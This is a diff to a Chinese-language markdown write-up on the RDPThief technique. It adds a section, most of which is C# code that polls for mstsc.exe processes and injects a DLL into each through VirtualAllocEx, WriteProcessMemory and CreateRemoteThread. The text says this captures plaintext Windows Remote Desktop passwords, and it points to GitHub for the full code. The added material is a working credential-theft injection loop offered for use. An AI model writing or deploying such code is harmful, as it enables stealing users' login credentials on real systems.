@@ -59,3 +59,31 @@ Process[] expProc = Process.GetProcessesByName("mstsc");
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210924114857.png)
 
+## 0x04
+
+经过测试，mstsc.exe启动后，运行RDPthief已经可以窃取到windows的明文密码，代码中还需要加入一个循环，用循环的方法检测mstsc什么时候启动，使用 Thread.Sleep 方法在每次迭代之间暂停一秒钟
+
+```c#
+while (true)
+            {
+                Process[] mstscProc = Process.GetProcessesByName("mstsc");
+                if (mstscProc.Length > 0)
+                {
+                    for (int i = 0; i < mstscProc.Length; i++)
+                    {
+                        int pid = mstscProc[i].Id;
+                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                        IntPtr outSize;
+                        Boolean res = WriteProcessMemory(hProcess, addr,
+                       Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
+                       "LoadLibraryA");
+                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr,
+                       0, IntPtr.Zero);
+                    }
+                }
+            Thread.Sleep(1000);//迭代中添加延时1000ms
+```
+
+完整代码，见github
